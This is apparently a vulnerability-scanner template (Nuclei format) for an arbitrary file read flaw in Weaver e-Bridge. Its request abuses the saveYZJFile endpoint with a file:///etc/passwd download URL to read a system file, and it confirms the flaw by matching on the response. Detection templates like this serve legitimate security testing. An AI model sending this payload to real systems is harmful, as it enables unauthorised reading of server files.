id: e-Bridge-fileRead

info:
  name: 泛微云桥任意文件读取漏洞
  author: Str1am
  severity: medium
  tags: e-Bridge

requests:
  - method: GET
    path:
      - "{{BaseURL}}/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "filepath"
          - "filesize"
        part: body
        condition: and